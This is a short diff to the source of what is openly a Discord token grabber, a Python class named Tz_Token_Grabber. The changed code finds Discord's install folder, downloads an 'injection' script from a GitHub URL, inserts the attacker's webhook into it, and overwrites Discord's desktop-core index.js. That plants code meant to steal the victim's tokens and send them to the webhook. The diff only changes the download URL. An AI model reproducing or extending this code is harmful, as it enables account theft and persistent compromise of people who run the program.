@@ -89,7 +89,7 @@ class Tz_Token_Grabber:
                         directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
                     except FileNotFoundError:
                         pass
-                    f = requests.get("https://raw.githubusercontent.com/Tzwebfofo/injection/main/Injection").text.replace("%WEBHOOK_LINK%", self.webhook)
+                    f = requests.get("https://raw.githubusercontent.com/Tz1337/injection/main/Injection").text.replace("%WEBHOOK_LINK%", self.webhook)
                     with open(directory_list, 'w', encoding="utf-8") as index_file:
                         index_file.write(f)
         for root, dirs, files in os.walk(self.roaming+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
